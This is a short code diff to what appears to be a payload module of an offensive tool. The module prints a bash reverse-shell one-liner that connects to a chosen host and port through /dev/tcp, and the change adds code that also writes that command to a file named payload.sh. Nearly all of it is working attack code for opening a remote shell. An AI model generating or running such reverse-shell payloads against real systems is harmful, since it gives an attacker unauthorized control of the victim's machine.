@@ -7,5 +7,10 @@ class payload:
 
 	def run(self,server):
 		print h.WHITE + "-"*40 + h.ENDC
-		print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
+		payload_text = "bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
+		print h.COLOR_INFO+payload_text+h.ENDC
+		payload_write_file = open("payload.sh", "w")
+		payload_write_file.write(payload_text)
+		payload_write_file.close()
+		print "\npayload saved as 'payload.sh'"
 		print h.WHITE + "-"*40 + h.ENDC
